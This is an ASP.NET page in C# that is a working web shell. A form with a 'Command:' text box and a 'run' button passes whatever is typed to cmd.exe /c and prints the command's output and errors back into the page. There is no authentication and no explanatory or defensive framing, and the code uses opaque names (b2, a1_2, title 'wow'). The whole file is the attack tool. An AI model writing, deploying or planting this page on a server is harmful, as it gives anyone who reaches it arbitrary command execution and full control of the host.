<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(Object sender, EventArgs e){
}
String b2(String arg){
	ProcessStartInfo psi = new ProcessStartInfo();
	psi.FileName = "cmd.exe";
	psi.Arguments = "/c " + arg;
	psi.RedirectStandardOutput = true;
	psi.RedirectStandardError = true;
	psi.UseShellExecute = false;
	Process p = Process.Start(psi);
        String s = "";
	StreamReader stmrdr = p.StandardOutput;
	s += stmrdr.ReadToEnd();
	stmrdr.Close();
	stmrdr = p.StandardError;
	s += stmrdr.ReadToEnd();
	stmrdr.Close();
	return s;
}
void a1_2(Object sender, System.EventArgs e){
	result.Text = Server.HtmlEncode(b2(addr.Text));
}
</script>

<HTML>
<HEAD>
<title>wow</title>
</HEAD>
<body>
<form id="g" method="post" runat="server">
<asp:Label id="lblText" runat="server">Command:</asp:Label>
<asp:TextBox id="addr" runat="server" Width="600px" />
<asp:Button id="testing" runat="server" Text="run" OnClick="a1_2">
</asp:Button>
</form>
<pre style="font-size: 16px">
<asp:Literal id="result" runat="server" />
</pre>
</body>
</HTML>
